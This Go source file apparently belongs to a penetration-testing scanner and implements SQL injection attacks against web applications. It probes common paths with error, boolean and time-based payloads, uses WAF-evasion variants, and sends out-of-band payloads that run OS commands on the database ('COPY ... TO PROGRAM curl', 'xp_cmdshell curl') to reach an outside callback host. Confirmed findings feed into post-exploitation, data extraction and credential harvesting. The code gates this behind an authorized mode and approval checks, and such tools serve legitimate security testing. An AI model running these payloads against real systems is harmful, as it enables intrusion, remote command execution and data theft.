// Package sqli implements a time-blind SQL injection scanner with calibration-based
// timing analysis. Unlike sqlmap's simple threshold, this scanner:
//
//  1. Measures baseline latency (5 requests, takes median)//  2. Injects SLEEP(3) — verifies delta > 2.5s over baseline
//  3. Confirms with SLEEP(5) — verifies delta tracks proportionally
//
// This dual-sleep confirmation eliminates false positives from slow servers,
// network jitter, or rate limiting. Only runs in authorized mode.
package sqli

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/evasion"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/oob"
	"github.com/stormbane-security/beacon/internal/postexploit"
	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/diffing"
	"github.com/stormbane-security/beacon/internal/scanner/paramdiscovery"
)


func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckExploitCredentialHarvest, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckExploitDataExtracted, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckWebSQLi, finding.SeverityCritical, finding.ModeDeep),
	)
}
const scannerName = "sqli"

// Payloads organized by database type. Each contains a SLEEP/WAITFOR/pg_sleep
// call that will be parameterized with the desired delay.
type payload struct {
	name    string // e.g., "mysql-sleep"
	dbType  string // mysql, postgres, mssql, sqlite
	prefix  string // characters before the sleep call
	sleepFn string // the sleep function template (%d = seconds)
	suffix  string // characters after the sleep call
}

var payloads = []payload{
	// MySQL — AND-based payloads first: SLEEP runs exactly once on the
	// matching row, avoiding N×SLEEP timeouts on multi-row tables.
	{name: "mysql-and-sleep-quote", dbType: "mysql", prefix: "1' AND SLEEP(", sleepFn: "%d", suffix: ") AND '1'='1"},
	{name: "mysql-and-sleep-num", dbType: "mysql", prefix: "1 AND SLEEP(", sleepFn: "%d", suffix: ")-- -"},

	// MySQL — OR-based (catches cases where id=1 doesn't match)
	{name: "mysql-sleep-quote", dbType: "mysql", prefix: "' OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},
	{name: "mysql-sleep-num", dbType: "mysql", prefix: "1 OR SLEEP(", sleepFn: "%d", suffix: ")-- -"},

	// PostgreSQL
	{name: "pg-sleep-quote", dbType: "postgres", prefix: "'; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},
	{name: "pg-sleep-num", dbType: "postgres", prefix: "1; SELECT pg_sleep(", sleepFn: "%d", suffix: ");-- -"},

	// MSSQL
	{name: "mssql-waitfor-quote", dbType: "mssql", prefix: "'; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
	{name: "mssql-waitfor-num", dbType: "mssql", prefix: "1; WAITFOR DELAY '0:0:", sleepFn: "%d", suffix: "'-- -"},
}

// Paths and parameters commonly vulnerable to SQLi.
var probePaths = []struct {
	path   string
	params []string
}{
	{"/", []string{"id", "page", "cat", "item", "name", "email", "sort", "order", "limit", "offset", "filter", "type", "status", "category", "date", "from", "to"}},
	{"/api/v1/users", []string{"id", "user_id"}},
	{"/search", []string{"q", "query", "search", "keyword", "name", "email", "sort", "order", "filter", "type", "status", "category", "date", "from", "to"}},
	{"/product", []string{"id", "pid", "product_id"}},
	{"/article", []string{"id", "article_id"}},
	{"/news", []string{"id", "nid"}},
	{"/login", []string{"username", "user"}},
	{"/api", []string{"id", "name", "email", "sort", "order", "limit", "offset", "filter", "type", "status", "category", "date", "from", "to"}},
	{"/api/v1", []string{"id", "name", "email", "sort", "order", "limit", "offset", "filter", "type", "status"}},
	{"/api/v2", []string{"id", "name", "email", "sort", "order", "limit", "offset", "filter", "type", "status"}},
	{"/query", []string{"q", "query", "id", "name", "filter", "type", "status", "sort", "order"}},
	{"/filter", []string{"q", "query", "id", "name", "filter", "type", "status", "category", "date", "from", "to"}},
	{"/items", []string{"id", "item_id", "name", "category", "sort", "order", "limit", "offset"}},
	{"/orders", []string{"id", "order_id", "status", "date", "from", "to", "sort", "limit"}},
	{"/admin", []string{"id", "user_id", "name", "email", "sort", "order", "filter", "type", "status"}},
	{"/dashboard", []string{"id", "filter", "type", "status", "date", "from", "to"}},
	{"/report", []string{"id", "type", "date", "from", "to", "filter", "status", "category"}},
	{"/export", []string{"id", "type", "format", "filter", "status", "date", "from", "to"}},
	{"/users", []string{"id", "user_id", "name", "email", "sort", "order", "limit", "offset", "status"}},
	{"/accounts", []string{"id", "account_id", "name", "email", "status", "type", "sort"}},
	{"/profile", []string{"id", "user_id", "name", "email"}},
	{"/settings", []string{"id", "name", "type", "category"}},
	{"/get", []string{"id", "name", "type", "category", "filter", "status"}},
	{"/list", []string{"id", "name", "type", "category", "sort", "order", "limit", "offset", "filter", "status"}},
	{"/view", []string{"id", "name", "type", "category"}},
	{"/detail", []string{"id", "name", "type", "category"}},
	{"/category", []string{"id", "name", "type", "sort", "order", "limit", "offset"}},
}

// sqlErrorPattern pairs a database type with an error substring to look for.
type sqlErrorPattern struct {
	dbType  string
	pattern string
}

// sqlErrorPatterns is an ordered list of error patterns to check. Specific
// database patterns come first so they match before the generic fallbacks.
var sqlErrorPatterns = []sqlErrorPattern{
	// MySQL
	{"mysql", "You have an error in your SQL syntax"},
	{"mysql", "mysql_fetch"},
	{"mysql", "mysql_num_rows"},
	// PostgreSQL
	{"postgres", "ERROR: syntax error at or near"},
	{"postgres", "pg_query"},
	{"postgres", "unterminated quoted string"},
	// SQLite
	{"sqlite", "SQLITE_ERROR"},
	{"sqlite", "unrecognized token"},
	{"sqlite", "near \"\":"},
	{"sqlite", "SQL logic error"},
	// MSSQL
	{"mssql", "Unclosed quotation mark"},
	{"mssql", "Microsoft OLE DB"},
	{"mssql", "ODBC SQL Server Driver"},
	// Generic (checked last)
	{"generic", "SQL syntax"},
	{"generic", "syntax error"},
	{"generic", "unexpected end of SQL"},
}

// errorBasedPayloads are injected into parameters to trigger SQL error messages.
var errorBasedPayloads = []struct {
	name  string
	value string
}{
	{"single-quote", "'"},
	{"boolean-tautology", "' OR '1'='1"},
}

// probeErrorBased sends error-inducing payloads and checks whether the response
// body contains SQL error messages. Returns a finding if an error pattern is
// matched, or nil if no error-based SQLi was detected.
func probeErrorBased(ctx context.Context, client *http.Client, scheme, asset, path, param string) *finding.Finding {
	baseURL := fmt.Sprintf("%s://%s%s?%s=1", scheme, asset, path, param)

	// Fetch baseline response body for boolean comparison.
	baselineBody, err := fetchBody(ctx, client, baseURL)
	if err != nil {
		return nil
	}

	for _, ep := range errorBasedPayloads {
		if ctx.Err() != nil {
			return nil
		}

		injectedURL := fmt.Sprintf("%s://%s%s?%s=%s",
			scheme, asset, path, param, url.QueryEscape("1"+ep.value))

		body, err := fetchBody(ctx, client, injectedURL)
		if err != nil {
			continue
		}

		// Check for SQL error strings in the response. The patterns list is
		// ordered so specific databases match before the generic fallback.
		bodyLower := strings.ToLower(body)
		for _, ep2 := range sqlErrorPatterns {
			if strings.Contains(bodyLower, strings.ToLower(ep2.pattern)) {
				detectedDB := ep2.dbType
				if detectedDB == "generic" {
					detectedDB = "unknown"
				}
				return &finding.Finding{
					CheckID:    finding.CheckWebSQLi,
					Module:     "deep",
					Scanner:    scannerName,
					Severity:   finding.SeverityCritical,
					Confidence: finding.ConfidenceVerified,
					Title:      fmt.Sprintf("Error-based SQL injection in %s parameter at %s", param, path),
					Description: fmt.Sprintf(
						"SQL error message detected in response body after injecting %q. "+
							"Matched pattern: %q (database: %s).",
						ep.value, ep2.pattern, detectedDB),
					Asset:    asset,
					DeepOnly: true,
					Evidence: map[string]any{
						"method":        "error-based",
						"path":          path,
						"parameter":     param,
						"payload":       ep.name,
						"db_type":       detectedDB,
						"error_pattern": ep2.pattern,
					},
					ProofCommand: fmt.Sprintf(
						`curl -sk '%s' | grep -i '%s'`,
						injectedURL, ep2.pattern),
					DiscoveredAt: time.Now(),
				}
			}
		}

		// Boolean-based: if the tautology payload produces a significantly
		// different response compared to the baseline, that's suspicious.
		// Uses response diffing with dynamic content stripping (timestamps,
		// CSRF tokens, session IDs) for more accurate detection than simple
		// body length comparison.
		if ep.name == "boolean-tautology" && baselineBody != "" && body != "" {
			similarity := diffing.Compare([]byte(baselineBody), []byte(body))
			if diffing.SignificantDiff([]byte(baselineBody), []byte(body), 0.7) {
				return &finding.Finding{
					CheckID:    finding.CheckWebSQLi,
					Module:     "deep",
					Scanner:    scannerName,
					Severity:   finding.SeverityCritical,
					Confidence: finding.ConfidenceProbable,
					Title:      fmt.Sprintf("Boolean-based SQL injection in %s parameter at %s", param, path),
					Description: fmt.Sprintf(
						"Response body changed significantly (similarity %.2f after stripping dynamic content) "+
							"when injecting boolean tautology %q. Baseline length: %d, injected length: %d.",
						similarity, ep.value, len(baselineBody), len(body)),
					Asset:    asset,
					DeepOnly: true,
					Evidence: map[string]any{
						"method":          "boolean-based",
						"path":            path,
						"parameter":       param,
						"payload":         ep.name,
						"baseline_length": len(baselineBody),
						"injected_length": len(body),
						"similarity":      similarity,
					},
					ProofCommand: fmt.Sprintf(
						`diff <(curl -sk '%s') <(curl -sk '%s')`,
						baseURL, injectedURL),
					DiscoveredAt: time.Now(),
				}
			}
		}
	}
	return nil
}

// fetchBody performs an HTTP GET and returns the response body as a string
// (capped at 128KB).
func fetchBody(ctx context.Context, client *http.Client, rawURL string) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-sqli-scanner)")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer func() { _ = resp.Body.Close() }()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
	if err != nil {
		return "", err
	}
	return string(b), nil
}

// bodyLengthDiff returns the relative size difference between two strings (0.0–1.0).
func bodyLengthDiff(a, b string) float64 {
	la, lb := float64(len(a)), float64(len(b))
	if la == 0 && lb == 0 {
		return 0
	}
	max := la
	if lb > max {
		max = lb
	}
	diff := la - lb
	if diff < 0 {
		diff = -diff
	}
	return diff / max
}

// Scanner checks for SQL injection using error-based, boolean-based, and
// time-blind techniques.
type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanAuthorized {
		return nil, nil
	}

	ac := authctx.HTTPClient(ctx)
	transport := ac.Transport
	if transport == nil {
		transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		}
	}
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
		Jar:       ac.Jar,
	}

	// Determine working scheme
	scheme := detectScheme(ctx, client, asset)
	if scheme == "" {
		return nil, nil
	}

	// Merge discovered parameters from crawl results into the hardcoded probe
	// list. This allows the scanner to test parameters that actually exist on
	// the target rather than relying solely on generic wordlists.
	effectiveProbePaths := probePaths
	if discovered := paramdiscovery.DiscoveredParamsFromContext(ctx); len(discovered) > 0 {
		effectiveProbePaths = mergeDiscoveredParams(probePaths, discovered)
	}

	var findings []finding.Finding

	for _, pp := range effectiveProbePaths {
		if ctx.Err() != nil {
			break
		}

		for _, param := range pp.params {
			if ctx.Err() != nil {
				break
			}

			// Phase 1: Error-based / boolean-based detection (fast — one request per payload)
			if f := probeErrorBased(ctx, client, scheme, asset, pp.path, param); f != nil {
				findings = append(findings, *f)
			}

			// Phase 2: Time-blind detection (may find injection points that
			// don't reflect errors)
			baseURL := fmt.Sprintf("%s://%s%s?%s=1", scheme, asset, pp.path, param)

			// Step 1: Measure baseline latency
			baseline, err := measureBaseline(ctx, client, baseURL, 5)
			if err != nil {
				continue
			}

			// Step 2: Try time-based payloads
			for _, p := range payloads {
				if ctx.Err() != nil {
					break
				}

				// First probe: SLEEP(3) — try original + WAF evasion variants.
				injected3 := buildPayload(p, 3)

				candidates := []string{injected3}
				candidates = append(candidates, evasion.SQLBypass(injected3)...)

				var confirmedURL3 string
				var confirmedDelta3 time.Duration
				var confirmedLabel string
				var confirmedIdx int

				for ci, candidate := range candidates {
					if ctx.Err() != nil {
						break
					}
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(candidate))
					latency, err := timeRequest(ctx, client, testURL)
					if err != nil {
						continue
					}
					delta := latency - baseline
					if delta >= 2500*time.Millisecond {
						confirmedURL3 = testURL
						confirmedDelta3 = delta
						confirmedIdx = ci
						if ci == 0 {
							confirmedLabel = p.name
						} else {
							confirmedLabel = fmt.Sprintf("%s+evasion-%d", p.name, ci)
						}
						break
					}
				}

				if confirmedURL3 == "" {
					continue // not significantly slower
				}

				// Step 3: Confirm with SLEEP(5) — delta should be ~5s over baseline.
				// Use the same evasion variant that worked for SLEEP(3), otherwise
				// a WAF that blocked the original will also block the confirmation.
				injected5 := buildPayload(p, 5)
				candidates5 := []string{injected5}
				candidates5 = append(candidates5, evasion.SQLBypass(injected5)...)
				confirm5 := injected5
				if confirmedIdx < len(candidates5) {
					confirm5 = candidates5[confirmedIdx]
				}
				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(confirm5))
				latency5, err := timeRequest(ctx, client, testURL5)
				if err != nil {
					continue
				}

				delta5 := latency5 - baseline
				if delta5 < 4500*time.Millisecond {
					continue // didn't track proportionally
				}

				// Both deltas confirmed — this is real SQLi
				findings = append(findings, finding.Finding{
					CheckID:    finding.CheckWebSQLi,
					Module:     "deep",
					Scanner:    scannerName,
					Severity:   finding.SeverityCritical,
					Confidence: finding.ConfidenceVerified,
					Title:      fmt.Sprintf("Time-blind SQL injection in %s parameter at %s", param, pp.path),
					Description: fmt.Sprintf(
						"Calibration-based timing analysis confirmed SQL injection. "+
							"Baseline: %s, SLEEP(3) delta: %s, SLEEP(5) delta: %s. "+
							"Database type: %s. Payload: %s",
						baseline.Round(time.Millisecond), confirmedDelta3.Round(time.Millisecond),
						delta5.Round(time.Millisecond), p.dbType, confirmedLabel),
					Asset:    asset,
					DeepOnly: true,
					Evidence: map[string]any{
						"method":          "time-blind",
						"path":            pp.path,
						"parameter":       param,
						"payload":         confirmedLabel,
						"db_type":         p.dbType,
						"baseline_ms":     baseline.Milliseconds(),
						"sleep3_delta_ms": confirmedDelta3.Milliseconds(),
						"sleep5_delta_ms": delta5.Milliseconds(),
						"waf_bypass":      confirmedLabel != p.name,
					},
					ProofCommand: fmt.Sprintf(
						`time curl -sk '%s'  # should take ~3s longer than baseline`,
						confirmedURL3),
					DiscoveredAt: time.Now(),
				})

				// Post-exploitation: attempt data extraction
				postFindings := postExploit(ctx, client, asset, scheme, pp.path, param, p.dbType)
				findings = append(findings, postFindings...)

				// One confirmed SQLi per parameter is enough
				break
			}

			// Try OOB-based detection if available — uses both DNS and HTTP
			// callbacks for maximum coverage across database types.
			if oobSrv := oob.FromContext(ctx); oobSrv != nil {
				token := oob.MakeToken(oobSrv, "sqli", asset, fmt.Sprintf("oob-%s-%s", pp.path, param))
				oobDomain := oob.PayloadDNS(oobSrv, token)
				oobURL := oob.PayloadURL(oobSrv, token)

				oobPayloads := []string{
					// MySQL: UNC path for DNS exfil
					fmt.Sprintf("' AND 1=LOAD_FILE('\\\\\\\\%s\\\\a')-- -", oobDomain),
					// MySQL: HTTP-based (limited, but works on some configs)
					fmt.Sprintf("' AND 1=LOAD_FILE('%s')-- -", oobURL),
					// PostgreSQL: COPY ... FROM PROGRAM with curl
					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'curl %s'-- -", oobURL),
					// PostgreSQL: DNS via nslookup
					fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s'-- -", oobDomain),
					// MSSQL: xp_cmdshell with curl
					fmt.Sprintf("'; EXEC xp_cmdshell 'curl %s'-- -", oobURL),
					// MSSQL: xp_dirtree for UNC path
					fmt.Sprintf("'; EXEC master..xp_dirtree '\\\\\\\\%s\\\\a'-- -", oobDomain),
				}

				for _, op := range oobPayloads {
					if ctx.Err() != nil {
						break
					}
					testURL := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape(op))
					_, _ = timeRequest(ctx, client, testURL)
				}

				// Check for OOB callback (brief wait)
				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
					findings = append(findings, finding.Finding{
						CheckID:    finding.CheckWebSQLi,
						Module:     "deep",
						Scanner:    scannerName,
						Severity:   finding.SeverityCritical,
						Confidence: finding.ConfidenceVerified,
						Title:      fmt.Sprintf("OOB SQL injection confirmed in %s at %s", param, pp.path),
						Description: fmt.Sprintf(
							"Out-of-band callback received from %s, confirming SQL injection. "+
								"The database executed a network request to the OOB server via %s. "+
								"This confirms the application is vulnerable to SQL injection with "+
								"the ability to make outbound network connections.",
							cb.RemoteAddr, cb.Protocol),
						Asset:    asset,
						DeepOnly: true,
						Evidence: map[string]any{
							"method":      "oob",
							"path":        pp.path,
							"parameter":   param,
							"oob_token":   token,
							"callback_ip": cb.RemoteAddr,
							"protocol":    cb.Protocol,
						},
						ProofCommand: fmt.Sprintf(
							`curl -sk '%s://%s%s?%s=%s'`,
							scheme, asset, pp.path, param,
							url.QueryEscape(fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'curl %s'-- -", oobURL))),
						DiscoveredAt: time.Now(),
					})
				}
			}
		}
	}

	// Web exploit dispatcher: run post-exploit chains with per-module approval.
	if scanType == module.ScanAuthorized && len(findings) > 0 {
		dispatcher := postexploit.NewWebExploitDispatcher()
		approveFunc := postexploit.ApproveFuncFromContext(ctx)
		fb := &postexploit.FindingBuilder{
			Module:  "deep",
			Scanner: scannerName,
			Asset:   asset,
		}
		for _, f := range findings {
			if ctx.Err() != nil {
				break
			}
			if dispatcher.CanExploit(f.CheckID) {
				if approveFunc == nil || !approveFunc("web-exploit-"+string(f.CheckID), asset, 0) {
					continue
				}
				exploitFindings := dispatcher.Dispatch(ctx, f, fb)
				findings = append(findings, exploitFindings...)
			}
		}
	}

	return findings, nil
}

func buildPayload(p payload, seconds int) string {
	sleep := fmt.Sprintf(p.sleepFn, seconds)
	return p.prefix + sleep + p.suffix
}

// measureBaseline sends N requests and returns the median latency.
func measureBaseline(ctx context.Context, client *http.Client, url string, n int) (time.Duration, error) {
	var latencies []time.Duration
	for i := 0; i < n; i++ {
		d, err := timeRequest(ctx, client, url)
		if err != nil {
			return 0, err
		}
		latencies = append(latencies, d)
	}
	sort.Slice(latencies, func(i, j int) bool { return latencies[i] < latencies[j] })
	return latencies[len(latencies)/2], nil // median
}

// timeRequest measures how long an HTTP GET takes.
func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.Duration, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; beacon-sqli-scanner)")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return elapsed, err
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()

	return elapsed, nil
}

func detectScheme(ctx context.Context, client *http.Client, asset string) string {
	// Strip port if present to determine default
	host := asset
	if idx := strings.LastIndex(asset, ":"); idx != -1 {
		host = asset[:idx]
	}
	_ = host

	for _, scheme := range []string{"https", "http"} {
		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		_ = resp.Body.Close()
		return scheme
	}
	return ""
}

// mergeDiscoveredParams combines hardcoded probe paths with parameters
// discovered from crawl results. For paths already in the hardcoded list,
// any newly discovered params are appended. For paths only in the discovered
// set, a new entry is created.
func mergeDiscoveredParams(hardcoded []struct{ path string; params []string }, discovered map[string][]string) []struct{ path string; params []string } {
	// Copy hardcoded entries and build a path→index lookup.
	result := make([]struct{ path string; params []string }, len(hardcoded))
	pathIdx := make(map[string]int, len(hardcoded))
	for i, pp := range hardcoded {
		params := make([]string, len(pp.params))
		copy(params, pp.params)
		result[i] = struct{ path string; params []string }{path: pp.path, params: params}
		pathIdx[pp.path] = i
	}

	for path, newParams := range discovered {
		if idx, ok := pathIdx[path]; ok {
			// Merge into existing entry — deduplicate.
			existing := make(map[string]bool, len(result[idx].params))
			for _, p := range result[idx].params {
				existing[p] = true
			}
			for _, p := range newParams {
				if !existing[p] {
					result[idx].params = append(result[idx].params, p)
					existing[p] = true
				}
			}
		} else {
			// New path from crawl results.
			result = append(result, struct{ path string; params []string }{path: path, params: newParams})
		}
	}
	return result
}
